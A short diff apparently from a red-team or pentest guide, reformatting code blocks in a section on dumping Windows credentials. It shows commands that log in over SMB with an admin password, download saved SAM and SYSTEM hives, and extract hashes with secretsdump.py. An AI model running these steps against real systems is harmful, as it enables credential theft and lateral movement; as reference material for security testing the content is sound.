@@ -165,9 +165,16 @@ WMI (Windows Management Instrumentation) is a legitimate Windows administration 
 
    # Download saved hives
    smbclient.py domain.local/admin:'Password123'@10.10.10.50
+   ```
+
+   In the launched SMB client; omit the displayed prompts:
+
+   ```text
    > get C:\temp\sam
    > get C:\temp\system
+   ```
 
+   ```bash
    # Extract hashes from saved hives
    secretsdump.py -sam sam -system system LOCAL
    ```
